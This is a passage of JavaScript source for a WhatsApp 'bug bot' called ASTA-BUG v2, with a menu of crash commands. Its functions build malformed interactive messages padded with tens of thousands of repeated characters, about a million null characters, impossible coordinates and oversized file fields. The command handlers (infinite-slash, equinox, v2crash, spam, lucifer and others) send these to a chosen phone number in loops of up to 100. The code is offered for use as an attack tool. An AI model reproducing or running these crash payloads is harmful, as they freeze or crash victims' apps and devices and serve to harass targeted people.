          }
        }
      }), {
        userJid: p47,
        quoted: p48
      });
      await ZoO.relayMessage(p47, vGenerateWAMessageFromContent7.message, p51 ? {
        participant: {
          jid: p47
        }
      } : {});
      console.log(chalk.green("wait bwang..."));
    }
    const v93 = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝙰𝚂𝚃𝚁𝙰𝙻𝚇𝙱𝚄𝙶\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@𝙰𝚂𝚃𝚁𝙰𝙻\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"𝐃𝐢𝐤𝐚𝐈𝐧𝐯𝐚𝐬𝐢𝐨𝐧𝐁𝐮𝐠" + "".repeat(777777) + "\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    };
            async function FrezeeMsg2(target) {
            let virtex = "⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽𝙰𝚂𝚃𝙰-𝙱𝚄𝙶 DEMON WIZARD 😈𝄽⃟⃟⃟⚔️⿻";
            let memekz = Date.now();

            await ZoO.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "😂⃟⃟⃟⃟⃚ ͢𝄽𝙰𝚂𝚃𝙰-𝙱𝚄𝙶𝄽⃟⃟⃟⚔️" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "SkyziEXECUTE" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
        
async function yoiAi(query) {
  return new Promise(async (resolve, reject) => {
    axios.get('https://api.yanzbotz.live/api/ai/labs-perplexity', {
      params: {
        query: query,
        model: 'llama-3.1-sonar-large-128k-online'
      }
    })
    .then(response => {
      resolve(response.data);
    })
    .catch(error => {
      reject(error);
    });
  });
};
        

async function FrezeeMsg1(target) {
            let virtex = "⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽𝙰𝚂𝚃𝙰-𝙱𝚄𝙶⃟⃟⃟⚔️⿻";

            ZoO.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "😂⃟⃟⃟⃟⃚ ͢𝙰𝚂𝚃𝙰-𝙱𝚄𝙶𝄽𝄽⃟⃟⃟⚔️" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "BaraEXECUTE" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        }
        async function Wow(you, Qtd, Fuck, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "INSTANT",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: Fuck
									},
									hasMediaAttachment: true
								},
								body: {
									text: "DIE HARD " + "@254114127157".repeat(50000)
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"HI GUYS " + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"FUCK YOU\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"HI GUYS \",\"sections\":[{\"title\":\"FUCK YOU\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY IMPROVEV2 \",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: y,
					quoted: Qtd
				}
			);

			await ZoO.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("ONE"));
		};
async function newgalaxy(target) {
    await ZoO.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Hai?",
                        format: "EXTENSIONS_1"
                    },
                    nativeFlowResponseMessage: {
                        name: 'galaxy_message',
                        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target } });
}
		async function BOM(X, Fuck, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "INSTANT",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: Fuck
									},
									hasMediaAttachment: true
								},
								body: {
									text: "DIE HARD "
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"HI GUYS " + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"FUCK YOU\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"HI GUYS \",\"sections\":[{\"title\":\"FUCK YOU\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY IMPROVEV2 \",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: VisiX
				}
			);

			await ZoO.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("ONE"));
		};
        
async function Combox(target) {
for (let i = 0; i < 20; i++) {
await f8(target)
await BugFrezee(target, Null)
await EncryptMessage(target, Null)
await FrezeeMsg1(target, Null)
await FrezeeMsg2(target, Null)
await newgalaxy(target)
}
console.log(chalk.red.bold(`DEMON WIZARD 😈⚔️${target}`))
}

async function Combox2(target) {
for (let i = 0; i < 20; i++) {
await CrashUi(target)
await f19(target)
await PayMent(target)
await BOM(target)
await f7(target)
}
console.log(chalk.red.bold(`DEMON WIZARD 😈⚔️ ${target}`))
}

async function Combox3(target) {
for (let i = 0; i < 20; i++) {
await CrashUi(target)
await f19(target)
await PayMent(target)
await f8(target)
await f9(target)
await f7(target)
await BugFrezee(target)
await EncryptMessage(target)
await FrezeeMsg1(target)
await FrezeeMsg2(target)
await Wow(target)
}
console.log(chalk.red.bold(`DEMON WIZARD 😈⚔️${target}`))
}

const reply = bokep => {
      ZoO.sendMessage(m.chat, {
        'text': bokep,
        'contextInfo': {
          'mentionedJid': [kontol],
          'forwardingScore': 0x98967f,
          'isForwarded': true,
          'externalAdReply': {
            'showAdAttribution': true,
            'containsAutoReply': true,
            'title': "⌁⃰𝙰𝚂𝚃𝙰-𝙱𝚄𝙶v2",
            'body': `©dave`,
            'previewType': "PHOTO",
            'thumbnailUrl': 'https://files.catbox.moe/796b19.jpeg',
            'sourceUrl': ''
          }
        }
      }, {
        'quoted': qkontak
      });
    };

switch (command) {

case "menu": case "asta": {
const tampilan = `
\`  ═══════ ⚔️ ═══════  
            *𝐀𝐒𝐓𝐀-𝐁𝐔𝐆* 
   ⚔️_*DEMON*_  _*WIZARD*_⚔️  
                
      ══════════════\`

> ©dave
> 𝙫𝙚𝙧𝙨𝙞𝙤𝙣 2.0

> 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 𝙢𝙚 𝙝𝙩𝙩𝙥𝙨://𝙬𝙖.𝙢𝙚/254114127157?𝙩𝙚𝙭𝙩=𝙃𝙞%20𝘿𝙖𝙫𝙚

> ⚠️ 𝙬𝙖𝙧𝙣𝙞𝙣𝙜 𝙚𝙭𝙘𝙚𝙨𝙨𝙞𝙫𝙚 𝙪𝙨𝙚 𝙤𝙛 𝙩𝙝𝙞𝙨 𝙨𝙘𝙧𝙞𝙥𝙩 𝙢𝙞𝙜𝙝𝙩 𝙡𝙚𝙖𝙙 𝙩𝙤 𝙗𝙖𝙣 𝙞𝙣𝙘𝙖𝙨𝙚 𝙩𝙝𝙖𝙩 𝙝𝙖𝙥𝙥𝙚𝙣𝙨 𝙘𝙖𝙡𝙡 𝙢𝙚 𝙨𝙤 𝙞 𝙘𝙖𝙣 𝙩𝙚𝙡𝙡 𝙮𝙤𝙪 𝙨𝙤𝙧𝙧𝙮 😝

 *𝙪𝙨𝙚𝙧 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙨*
> 🙂⃤ 𝙨𝙚𝙡𝙛 
> 🙂⃤ 𝙥𝙪𝙗𝙡𝙞𝙘 
> 🙂⃤ 𝙖𝙙𝙙𝙤𝙬𝙣𝙚𝙧 
> 🙂⃤ 𝙙𝙚𝙡𝙤𝙬𝙣𝙚𝙧
> 🙂⃤ 𝙙𝙖𝙫𝙚
> 🙂⃤ 𝙖𝙙𝙙𝙥𝙧𝙚𝙢
> 🙂⃤ 𝙙𝙚𝙡𝙥𝙧𝙚𝙢
 
 *𝘼𝙎𝙏𝘼 𝘽𝙐𝙂'𝙎*
> 🙂⃤ 𝘿𝙚𝙢𝙤𝙣-𝙎𝙡𝙖𝙨𝙝𝙚𝙧 254𝘅𝘅𝘅𝘅
> 🙂⃤ 𝙞𝙣𝙛𝙞𝙣𝙞𝙩𝙚-𝙨𝙡𝙖𝙨𝙝 254𝘅𝘅𝘅𝘅
> 🙂⃤ 𝙚𝙦𝙪𝙞𝙣𝙤𝙭 254𝘅𝘅𝘅𝘅
> 🙂⃤ 𝙖𝙣𝙩𝙞-𝙢𝙖𝙜𝙞𝙘 254𝘅𝘅𝘅𝘅
 
 *𝘾𝙍𝘼𝙎𝙃 𝘽𝙐𝙂𝙎* 
> 🙂⃤ 𝙡𝙖𝙜𝙗𝙪𝙜𝙨 254𝘅𝘅𝘅𝘅
> 🙂⃤ 𝙫2𝙘𝙧𝙖𝙨𝙝 254𝘅𝘅𝘅𝘅
> 🙂⃤ 𝙙𝙖𝙫𝙚-𝙨𝙤𝙡𝙤𝙨 254𝘅𝘅𝘅𝘅
> 🙂⃤ 𝙜𝙤𝙤𝙙𝙣𝙞𝙜𝙝𝙩 254𝘅𝘅𝘅𝘅
> 🙂⃤ 𝙨𝙥𝙖𝙢 254𝘅𝘅𝘅𝘅

 *𝘼𝙈𝙊𝙐𝙉𝙏 𝘽𝙐𝙂𝙎*
> 🙂⃤ 𝙖𝙨𝙩𝙖-𝙘𝙧𝙖𝙨𝙝 254𝘅𝘅𝘅𝘅|𝟱
> 🙂⃤ 𝙪𝙞-𝙖𝙩𝙩𝙖𝙘𝙠 254𝘅𝘅𝘅𝘅|𝟱
> 🙂⃤ 𝙣𝙚𝙩𝙘𝙧𝙖𝙨𝙝 254𝘅𝘅𝘅𝘅|𝟱

 *𝘿𝙄𝙍𝙀𝘾𝙏 𝘿𝙈 𝘽𝙐𝙂𝙎*
> 🙂⃤ 𝙤𝙛𝙛𝙡𝙞𝙣𝙚-𝙢𝙖𝙜𝙞𝙘
> 🙂⃤ 𝙖𝙨𝙩𝙖𝙗𝙪𝙜

 https://whatsapp.com/channel/0029VavpWUvGk1Fkbzz0vz0v
`
let menu = {
image: {url: `${ytta}`}, 
  caption: tampilan,
  contextInfo:{externalAdReply:{
  title: '𝐀𝐒𝐓𝐀-𝐁𝐔𝐆v2',
  body: '©dave', 
  showAdAttribution: true,
  thumbnailUrl: 'https://files.catbox.moe/796b19.jpeg',
  mediaType: 4,
  MediaUrl: 'https://whatsapp.com/channel/0029VavpWUvGk1Fkbzz0vz0v',
  sourceUrl: "https://whatsapp.com/channel/0029VavpWUvGk1Fkbzz0vz0v",
  }}
  }
await ZoO.sendMessage(from, menu, {quoted: Out }
);
await ZoO.sendMessage(m.chat, {audio: {url: `${ytt}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break

/*case 'hentai': {
reply(`*\`TOBAT BRO PIKIRIN MASA DEPAN KOCAK MASA MAU NONTON HENTAI\`*`)
await ZoO.sendMessage(m.chat, {audio: {url: `${ytt}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break

case "cek-khodam": {
if (!isPremium) return reply("*KHUSUS PREMIUM!!*")
if (!args[0]) return reply('NAMA LU MANA ANJG')
const khodam = [
"Ikan", "Sendal", "Genderuwo", "Ijat", "Fizi", "kaleng kejepit", "Raja Ibelis", "Singa", "Lele", "Ayam Kaepci","kucing mewing","tutup panci","ular sigma","kucing isriwil","kapal karam","anggrek mekar Pontianak","bagong leweng","lonte arab"," kosong","pertamina kebalik","ambatukam","kodok terbang","laba laba sunda","ambatron","laba laba salto","macan putih"]
const hasil = khodam[Math.floor(Math.random() * khodam.length)]
const teks = `
\`HASIL CEK KHODAM\`
\`NAMA\` : *${args[0]}*
\`KHODAM\` : *${hasil}*
`
reply(teks)
}
break

case "cek-ganteng": {
if (!isPremium) return reply("*KHUSUS PREMIUM!!*")
if (!args[0]) return reply('NAMA LU MANA??')
const ganteng = [
"10", "20", "0", "30", "40", "50", "60", "70","80","90","100"]
const hasil = ganteng[Math.floor(Math.random() * ganteng.length)]
const teks = `
\`HASIL CEK GANTENG\`
\`NAMA\` : *${args[0]}*
\`PERSENTASE\` : *${hasil}℅*
`
reply(teks)
}
break
case "sound1": {
if (!isOwner && !isPremium) return reply("LU SIAPA KOCAK")
await ZoO.sendMessage(m.chat, {audio: {url: `${sound1}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case "sound2": {
if (!isOwner && !isPremium) return reply("LU SIAPA KOCAK")
await ZoO.sendMessage(m.chat, {audio: {url: `${sound2}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case "sound3": {
if (!isOwner && !isPremium) return reply("LU SIAPA KOCAK")
await ZoO.sendMessage(m.chat, {audio: {url: `${sound3}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case "sound4": {
if (!isOwner && !isPremium) return reply("LU SIAPA KOCAK")
await ZoO.sendMessage(m.chat, {audio: {url: `${sound4}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case "sound5": {
if (!isOwner && !isPremium) return reply("LU SIAPA KOCAK")
await ZoO.sendMessage(m.chat, {audio: {url: `${sound5}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case "sound6": {
if (!isOwner && !isPremium) return reply("LU SIAPA KOCAK")
await ZoO.sendMessage(m.chat, {audio: {url: `${sound6}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case 'remini': {
if (!isOwner && !isPremium) return reply("LU SIAPA KOCAK")
if (!/image/.test(mime)) return m.reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
await ZoO.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
const { remini } = require('./Databases/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance");
ZoO.sendMessage(m.chat, { image: proses, caption: 'Sukses'}, { quoted: m})
}
break
case "cek-cantik": {
if (!isPremium) return reply("*KHUSUS PREMIUM!!*")
if (!args[0]) return reply('NAMA LU MANA??')
const ganteng = [
"10", "20", "0", "30", "40", "50", "60", "70","80","90","100"]
const hasil = ganteng[Math.floor(Math.random() * ganteng.length)]
const teks = `
\`HASIL CEK GANTENG\`
\`NAMA\` : *${args[0]}*
\`PERSENTASE\` : *${hasil}℅*
`
reply(teks)
}
break
case 'ai': {
if (!isOwner && !isPremium) return reply("LU SIAPA BEGO")
  	if (!text) return reply(`• Example: ${prefix + command} siapakah Pencipta ac Xtrasher`); 
  	reply('_Wait Proses.._');
  	let suki = await yoiAi(text);     
    reply(suki.result)
    }
    break
*/
case "public": {
if (!isCreator) return reply("🚫 OWNER COMMAND ")
ZoO.public = true
reply("*SUCCESSFULLY SET ASTA BUG TO PUBLIC *")
}
break
case "self": {
if (!isCreator) return reply("🚫 OWNER COMMAND ")
ZoO.public = false
reply("*SUCCESSFULLY SET ASTA BUG TO PRIVATE *")
}
break
case "addowner":
if (!isCreator && !isOwner) return reply(`*\`YOU LACK ACCESS 🚫\`*`)
if (!args[0]) return reply(`Use  ${prefix+command} number\nExample${prefix+command} 254×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await ZoO.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`use a valid Whatsapp number !!!`)
owner.push(bnnd)
fs.writeFileSync('./Databases/database/owner.json', JSON.stringify(owner))
reply(`Number ${bnnd} Has Become Owner!!!`)
break

case "delowner":
if (!isCreator && !isOwner) return reply(`*\`YOU LACK ACCESS 🚫\`*`)
if (!args[0]) return reply(`use${prefix+command} number\nexample ${prefix+command} 254×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./Databases/database/owner.json', JSON.stringify(owner))
reply(` ${ya} is no longer an admin`)
break
case "addprem":{
if (!isCreator) return reply(`*\`YOU LACK ACCESS 🚫\`*`)
if (!args[0]) return reply(`*\`use :\`* *${command} number*\n*\`EXAMPLE :\`* *${command} 254XXXX*`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await ZoO.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`*\`error ⚠️\`*`)
Premium.push(prrkek)
fs.writeFileSync("./Databases/database/murbug.json", JSON.stringify(Premium))
reply(`*\`SUCSESS\`*`)
}
break
case "delprem":{
if (!isCreator) return reply(`*\`YOU LACK ACCESS 🚫\`*`)
if (!args[0]) return reply(`*\`use :\`* *${command} number*\n*\`example :\`* *${command} 254XXXX*`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
m4 = Premium.indexOf(ya)
Premium.splice(m4, 1)
fs.writeFileSync("./Databases/database/murbug.json", JSON.stringify(Premium))
reply(`*\`SUCSESS!\`*`)
}
break
case "dave": {
if (!isGroup) return reply(`*\`GROUP COMMAND!\`*`)
if (!isCreator) return reply(`CONTACT DAVE https://wa.me/254114127157?text=Hi%20Dave`)
if (!m.quoted && !text) return reply(`*\`WHERE IS THE TEXT??\`*`)
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
ZoO.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case 'infinite-slash': {
if (!isOwner) return reply("CONTACT DAVE https://wa.me/254114127157?text=Hi%20Dave")
if (!q) return reply(`Example: ${prefix + command} 254×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("ELIMINATING ")
for (let i = 0; i < 30; i++) {
await Combox(target)
await CrashUi(target)
await f19(target)
await PayMent(target)
}
reply("ASTA HAS ELIMINATED ")
}
break

case 'equinox': case "anti-magic": case "darkmeter": {
if (!isOwner) return reply("CONTACT DAVE https://wa.me/254114127157?text=Hi%20Dave")
if (!q) return reply(`Example: ${prefix + command} 254×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("ELIMINATING ")
for (let i = 0; i < 100; i++) {
await Combox2(target, jumlah)
await Combox3(target, jumlah)
await Combox2(target, jumlah)
await Combox3(target, jumlah)
await Combox2(target, jumlah)
await Combox3(target, jumlah)
await Combox2(target, jumlah)
await Combox3(target, jumlah)
}
reply("ASTA HAS ELIMINATED ")
}
break

case 'Demon-Slasher': {
if (!isOwner) return reply("CONTACT DAVE https://wa.me/254114127157?text=Hi%20Dave")
if (!q) return reply(`Example: ${prefix + command} 254×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("ELIMINATING ")
for (let i = 0; i < 50; i++) {
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
}
reply("ASTA HAS ELIMINATED ")
}
break
case 'v2crash': {
if (!isOwner) return reply("CONTACT DAVE https://wa.me/254114127157?text=Hi%20Dave")
if (!q) return reply(`Example: ${prefix + command} 254×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("ELIMINATING ")
for (let i = 0; i < 50; i++) {
await Combox(target)
await f9(target, Null)
await CrashUi(target, Null)
await f19(target, Null)
await PayMent(target, Null)
await combox(target) 
await combox2(target) 
await Combox(target)
await f9(target, Null)
await CrashUi(target, Null)
await f19(target, Null)
await PayMent(target, Null)
await Combox(from, jumlah) 
await combox2(target) 
}
reply("ASTA HAS ELIMINATED ")
}
break
case 'dave-solos': {
if (!isOwner) return reply("CONTACT DAVE https://wa.me/254114127157?text=Hi%20Dave")
if (!q) return reply(`Example: ${prefix + command} 254×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("ELIMINATING ")
for (let i = 0; i < 50; i++) {
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(from, jumlah) 
await combox2(target) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(from, jumlah) 
await combox2(target) 
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
}
reply("ASTA HAS ELIMINATED ")
}
break
case 'goodnight': {
if (!isOwner) return reply("CONTACT DAVE https://wa.me/254114127157?text=Hi%20Dave")
if (!q) return reply(`Example: ${prefix + command} 254×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("ELIMINATING ")
for (let i = 0; i < 50; i++) {
await Combox(target)
await f9(target)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(target) 
await combox2(target) 
await f7(target)
await Combox(target)
await f9(target)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(target) 
await Combox2(target) 
await f7(target)
}
reply("ASTA HAS ELIMINATED ")
}
break
case 'spam': {
if (!isOwner) return reply("CONTACT DAVE https://wa.me/254114127157?text=Hi%20Dave")
if (!q) return reply(`Example: ${prefix + command} 254×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("ELIMINATING ")
for (let i = 0; i < 50; i++) {
await Combox(target)
await f9(target)
await CrashUi(target, null)
await f19(target)
await PayMent(target)
await combox2(target) 
await Combox3(from, jumlah)
await f8(target)
await Combox(target)
await f9(target)
await CrashUi(target, null)
await f19(target)
await PayMent(target)
await combox2(target) 
await Combox3(from, jumlah)
await f8(target)
}
reply("ASTA HAS ELIMINATED ")
}
break
case 'behemoth': {
if (!isOwner) return reply("CONTACT DAVE https://wa.me/254114127157?text=Hi%20Dave")
if (!q) return reply(`Example: ${prefix + command} 254×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("ELIMINATING ")
for (let i = 0; i < 50; i++) {
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(from, jumlah) 
await f7(target)
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
await Combox(target)
await f9(target, Null)
await CrashUi(target)
await f19(target)
await PayMent(target)
await Combox(from, jumlah) 
await f7(target)
await Combox3(from, jumlah) 
await OLDLOC(target, Null) 
}
reply("ASTA HAS ELIMINATED ")
}
break
case 'lucifer': {
if (!isOwner) return reply("CONTACT DAVE https://wa.me/254114127157?text=Hi%20Dave")
if (!q) return reply(`Example: ${prefix + command} 254×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("ELIMINATING ")
